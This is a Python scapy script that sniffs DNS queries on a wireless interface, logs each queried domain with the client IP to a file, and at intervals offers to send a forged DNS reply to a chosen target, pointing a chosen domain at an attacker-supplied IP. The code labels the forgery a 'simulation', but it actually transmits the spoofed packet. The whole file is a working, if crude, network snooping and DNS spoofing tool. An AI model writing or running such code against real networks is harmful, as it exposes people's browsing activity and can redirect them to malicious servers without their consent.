#!/usr/bin/env python3
from scapy.all import *
import threading
import time
import sys
import os

LOG_FILE = "dns_log.txt"
CAPTURE_INTERFACE = "wlan0"  # Change to your NIC
RUNNING = True

# Store DNS queries
dns_queries = []

# Ask user for spoofing configuration
target_ip = input("Enter target client IP: ").strip()
spoof_domain = input("Enter domain to spoof: ").strip()
spoof_ip = input("Enter IP address to spoof to: ").strip()

def log_query(pkt):
    if pkt.haslayer(DNSQR):
        query_name = pkt[DNSQR].qname.decode("utf-8")
        src_ip = pkt[IP].src
        log_entry = f"{time.ctime()} - {src_ip} → {query_name}"
        dns_queries.append(query_name)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry + "\n")
        print("[LOG]", log_entry)

def sniff_dns():
    sniff(filter="udp port 53", prn=log_query, iface=CAPTURE_INTERFACE, store=False)

def spoof_simulation(target_ip, domain, spoof_ip):
    # This sends a fake DNS response ONLY to the target
    pkt = IP(dst=target_ip) / UDP(dport=33333, sport=53) / \
          DNS(id=1234, qr=1, aa=1, qd=DNSQR(qname=domain), an=DNSRR(rrname=domain, ttl=10, rdata=spoof_ip))
    send(pkt, verbose=0)
    print(f"[SIMULATION] Sent fake DNS reply: {domain} → {spoof_ip} to {target_ip}")

def user_prompt():
    global RUNNING
    while RUNNING:
        time.sleep(300)  # 5 minutes
        print("\n[+] DNS Queries in the last 5 minutes:")
        for q in set(dns_queries):
            print("  -", q)
        choice = input("\nDo you want to simulate spoofing now? (y/n): ").strip().lower()
        if choice == "y":
            spoof_simulation(target_ip, spoof_domain, spoof_ip)
        dns_queries.clear()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Please run as root!")
        sys.exit(1)

    print("[*] Starting DNS logger on", CAPTURE_INTERFACE)
    threading.Thread(target=user_prompt, daemon=True).start()
    try:
        sniff_dns()
    except KeyboardInterrupt:
        RUNNING = False
        print("\n[!] Stopping...")
